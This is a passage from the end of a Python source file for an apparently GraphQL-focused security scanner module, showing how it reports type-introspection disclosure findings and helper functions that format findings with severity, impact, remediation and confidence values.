                    sensitive_summary.append(f"{dt['type']}: {', '.join(dt['sensitive'])}")

            findings.append(self._make_finding(
                "GraphQL Type Information Disclosure", url,
                "high" if sensitive_summary else "medium",
                f"__type queries expose internal types and fields. "
                f"Disclosed {len(disclosed_types)} types. "
                + (f"Sensitive fields found: {'; '.join(sensitive_summary[:5])}" if sensitive_summary
                   else f"Types: {', '.join(d['type'] for d in disclosed_types[:10])}"),
                "Block __type queries in production or implement type-level access control",
                response_data={"disclosed_types": disclosed_types[:10]},
            ))

        return findings

    # ── Helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _flatten_data(data: dict, prefix: str = "") -> dict:
        """Flatten nested dict for field analysis."""
        flat = {}
        for k, v in data.items():
            key = f"{prefix}.{k}" if prefix else k
            if isinstance(v, dict):
                flat.update(GraphQLAttackModule._flatten_data(v, key))
            else:
                flat[k] = v
        return flat

    @staticmethod
    def _make_finding(title: str, url: str, severity: str, description: str,
                      remediation: str, parameter: str = None, payload: str = None,
                      response_data: dict = None) -> dict:
        """Create a standardized finding dict."""
        f = {
            "title": title[:500],
            "url": url[:2000],
            "severity": severity,
            "description": description,
            "remediation": remediation,
            "impact": _severity_impact(severity),
            "ai_confidence": _severity_confidence(severity),
        }
        if parameter:
            f["parameter"] = parameter
        if payload:
            f["payload_used"] = str(payload)[:2000]
        if response_data:
            f["response_data"] = response_data
        return f


def _severity_impact(severity: str) -> str:
    return {
        "critical": "Full data exposure or remote code execution via GraphQL API",
        "high": "Significant data leak or authorization bypass through GraphQL",
        "medium": "Information disclosure or potential for targeted attacks via GraphQL",
        "low": "Minor information leak with limited direct impact",
    }.get(severity, "Potential security issue in GraphQL implementation")


def _severity_confidence(severity: str) -> float:
    return {"critical": 0.9, "high": 0.8, "medium": 0.7, "low": 0.6}.get(severity, 0.7)
